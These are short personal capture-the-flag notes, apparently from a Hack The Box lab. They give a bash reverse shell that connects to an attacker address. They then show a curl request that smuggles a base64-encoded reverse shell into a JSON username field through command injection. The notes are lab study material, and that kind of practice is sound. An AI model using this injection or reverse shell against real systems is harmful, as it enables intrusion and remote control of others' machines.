# CTF_notes.md

## Deobfuscator
[de4js](https://lelinhtinh.github.io/de4js/)
## Notes
- it's important to decode the obfuscated code too!
- sometimes curl might work better than a browser
- when doing a reverse shell you might need to encode the command to not have it messed up for example if you want to execute a command sent as a web request:
```bash -i >& /dev/tcp/10.10.14.4/1234 0>&1```
you encode it and send it as
```curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie
"PHPSESSID=nufb0km8892s1t9kraqhqiecj6" --header "Content-Type: application/json" --data
'{"username":"test;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzEyMzQgMD4mMQo= |
base64 -d | bash;"}'```